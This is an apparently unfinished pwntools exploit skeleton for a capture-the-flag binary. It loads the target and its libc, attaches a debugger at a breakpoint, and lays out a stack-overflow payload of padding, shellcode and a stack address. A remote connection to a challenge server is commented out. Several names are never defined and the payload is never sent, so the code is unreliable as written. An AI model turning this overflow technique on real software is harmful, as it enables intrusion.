#!/usr/bin/python3
from pwn import *
import sys
context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
e = context.binary = ELF("./pwn")
p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"
+"\nbreak *main+116"
+"\nc"
)
p = elf.debug()

libc = ELF("./glibc/libc.so.6")
exe = ELF("./pwn")
rop = ROP(exe)
payload = flat([
padding,
shellcode,
stack_addr
])
#p = pwn.remote("94.237.53.3",45701)
p.interactive()